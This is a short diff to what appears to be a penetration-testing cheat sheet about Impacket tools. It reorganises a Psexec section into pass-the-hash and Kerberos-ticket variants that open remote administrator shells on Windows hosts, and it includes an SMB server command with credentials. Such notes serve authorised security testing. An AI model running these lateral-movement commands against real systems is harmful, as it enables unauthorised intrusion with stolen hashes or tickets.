@@ -40,11 +40,19 @@ sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123
 
 ## Psexec
 
+{% hint style="warning" %}
+Ensure that you added the DC ip into /etc/hosts and set up the DNS into /etc/resolv.conf
+{% endhint %}
+
+### Pass the hash
+
 ```csharp
 ./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<HOSTNAME>
+```
 
-# or without password (kerberos)
+### Kerberos ticket
 
+```csharp
 ./psexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
 ```
 
